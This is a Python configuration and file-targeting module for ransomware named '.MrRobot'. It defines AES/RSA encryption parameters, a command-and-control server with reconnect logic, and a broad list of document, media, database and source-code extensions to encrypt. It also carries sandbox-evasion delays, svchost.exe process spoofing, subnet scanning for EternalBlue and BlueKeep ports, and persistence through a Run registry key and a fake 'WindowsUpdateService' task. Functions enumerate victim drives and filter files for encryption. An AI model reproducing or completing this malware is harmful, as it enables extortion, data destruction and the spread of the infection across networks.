import platform
import os



# ==================== Encryption Settings ====================
ENCRYPTION_EXTENSION = ".MrRobot"  
AES_KEY_SIZE = 32 
RSA_KEY_SIZE = 4096  
MAX_FILE_SIZE = 100 * 1024 * 1024  
MAX_RETRIES = 3 
PUBLIC_KEY =    "اومبعد ساهل " 
FILE_HEADER_MAGIC = b'MRBT'        
FILE_FORMAT_VERSION = 2           
AES_KEY_SIZE_PER_FILE = 32         
NONCE_SIZE = 8                    
RSA_KEY_SIZE = 4096

# ==================== Communication Settings ====================
SERVER_IP = "IDK"  
SERVER_PORT = 1234  
BUFFER_SIZE = 2048  # Network buffer size in bytes
RECONNECT_DELAY = 60  # Seconds to wait before reconnecting if connection fails
MAX_RECONNECT_ATTEMPTS = 5  # Maximum number of reconnection attempts

# ==================== Target Files Settings ====================
TARGET_EXTENSIONS = [
    # Documents and Text Files
    ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".odt", ".rtf", ".md", ".tex", ".log", ".msg", ".pages", ".wpd",
    
    # Database Files
    ".db", ".sql", ".mdb", ".accdb", ".sqlite", ".csv", ".tsv",
    
    # Image Files
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".tif", ".webp",
    ".svg", ".ico", ".heic", ".raw", ".psd", ".xcf",
    
    # Media Files (Video/Audio)
    ".mp4", ".mkv", ".avi", ".mov", ".flv", ".wmv", ".webm", ".mpeg",
    ".mpg", ".3gp", ".m4v", ".ts", ".mp3", ".wav", ".flac", ".aac",
    ".ogg", ".oga", ".m4a", ".wma", ".aiff", ".mid",
    
    # Archive Files
    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".iso", ".cab",
    
    # Source Code Files
    ".py", ".c", ".cpp", ".h", ".java", ".js", ".ts", ".html", ".css",
    ".php", ".rb", ".go", ".rs", ".swift", ".cs", ".json", ".xml",
    ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf",
    
    # Other Important Files
    ".torrent", ".url", ".lnk", ".ics", ".vcard", ".sig"
]

# ==================== Excluded Directories ====================

WINDOWS_EXCLUDED_DIRS = [
    'windows', 'system32', 'system64', 'program files', 
    'program files (x86)', 'boot', 'recovery', '$recycle.bin'
]  # System directories to avoid to prevent OS damage

WINDOWS_EXCLUDED_FILES = [
    'pagefile.sys', 'hiberfil.sys', 'swapfile.sys',
    'desktop.ini', 'thumbs.db'
]  # System files to avoid

LINUX_EXCLUDED_DIRS = [
    
    '/bin', '/sbin', '/usr/bin', '/usr/sbin', '/lib', '/lib64',
    '/etc', '/var', '/run', '/proc', '/sys', '/root', '/boot',
    '/dev', '/mnt', '/media'
]

LINUX_EXCLUDED_FILES = [
  
    '/etc/passwd', '/etc/shadow', '/etc/group', '/etc/gshadow',
    '/etc/sudoers', '/etc/hosts', '/etc/hostname', '/etc/resolv.conf',
    '/etc/fstab', '/boot/vmlinuz', '/boot/initrd.img',
    '/boot/grub/grub.cfg', '/root/.bashrc'
]

# ==================== Stealth Settings ====================
SANDBOX_SLEEP_MIN = 300  # 5 minutes - Minimum sleep time if sandbox detected
SANDBOX_SLEEP_MAX = 600  # 10 minutes - Maximum sleep time if sandbox detected
ANTI_ANALYSIS_CHECKS = True  # Enable anti-analysis detection
PROCESS_NAME = "svchost.exe"  # Process name to spoof for stealth

# ==================== Propagation Settings ====================
NETWORK_SCAN_SUBNET = "192.168.1.0/24"  # Network subnet to scan for propagation
SMB_PORTS = [445, 139]  # SMB ports to check for EternalBlue vulnerability
RDP_PORTS = [3389]  # RDP ports to check for BlueKeep vulnerability
SCAN_THREADS = 5  # Number of concurrent network scanning threads

# ==================== Persistence Settings ====================
AUTOSTART_REGISTRY_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
AUTOSTART_VALUE_NAME = "WindowsSpooler"
INSTALL_PATH = "Microsoft\\Windows\\spoolsv.exe"
SCHEDULED_TASK_NAME = "WindowsUpdateService"

# File system scanning functions
def windows_partition():
    windows_list = []
    for i in range(65, 91):
        drive = chr(i) + ":\\"  
        if os.path.exists(drive):
            windows_list.append(drive)
    return windows_list

def linux_partition():
    linux_list = [
        "/home", "/media", "/mnt", "/tmp", 
        "/var/tmp", "/opt", "/srv", "/usr/local"
    ]
    return [d for d in linux_list if os.path.exists(d)]

def get_drives_to_scan():
    system = platform.system().lower()
    if system == "windows":
        return windows_partition()
    else:
        return linux_partition()

def get_excluded_dirs():
    system = platform.system().lower()
    if system == "windows":
        return WINDOWS_EXCLUDED_DIRS
    else:
        return LINUX_EXCLUDED_DIRS

def get_excluded_files():
    system = platform.system().lower()
    if system == "windows":
        return WINDOWS_EXCLUDED_FILES
    else:
        return LINUX_EXCLUDED_FILES

def get_victim_specific_config():
    system = platform.system().lower()
    
    if system == "windows":
        return {
            'drives_function': 'windows_partition',
            'default_path': os.environ['APPDATA'],
            'install_path': os.path.join(os.environ['APPDATA'], "Microsoft\\Windows\\spoolsv.exe"),
            'public_key_path': 'public.pem',
            'drives': get_drives_to_scan(),
            'excluded_dirs': get_excluded_dirs(),
            'excluded_files': get_excluded_files()
        }
    else:
        return {
            'drives_function': 'linux_partition',
            'default_path': '/tmp',
            'install_path': '/usr/bin/spoolsv',
            'public_key_path': '/tmp/public.pem',
            'drives': get_drives_to_scan(),
            'excluded_dirs': get_excluded_dirs(),
            'excluded_files': get_excluded_files()
        }

# Load configurations
VICTIM_CONFIG = get_victim_specific_config()
EXCLUDED_DIRS = get_excluded_dirs()
EXCLUDED_FILES = get_excluded_files()

# File validation function
def validate_file_for_encryption(file_path):
    if not os.path.exists(file_path):
        return False
    if not os.path.isfile(file_path):
        return False
        
    system = platform.system().lower()
    if system == "windows":
        system_files = ['pagefile.sys', 'hiberfil.sys', 'swapfile.sys']
        if any(sys_file in file_path.lower() for sys_file in system_files):
            return False
    else:
        linux_critical_files = [
            '/etc/passwd', '/etc/shadow', '/etc/group', '/etc/gshadow',
            '/etc/sudoers', '/boot/vmlinuz', '/boot/initrd.img'
        ]
        if file_path in linux_critical_files:
            return False
        
    if system == "windows":
        if any(excluded_dir in file_path.lower() for excluded_dir in EXCLUDED_DIRS):
            return False
    else:
        if file_path.startswith(tuple(EXCLUDED_DIRS)):
            return False
        
    if system == "windows":
        filename = os.path.basename(file_path).lower()
        if filename in EXCLUDED_FILES:
            return False
    else:
        if file_path in EXCLUDED_FILES:
            return False
        
    try:
        file_size = os.path.getsize(file_path)
        return 0 < file_size <= MAX_FILE_SIZE
    except:
        return False
    

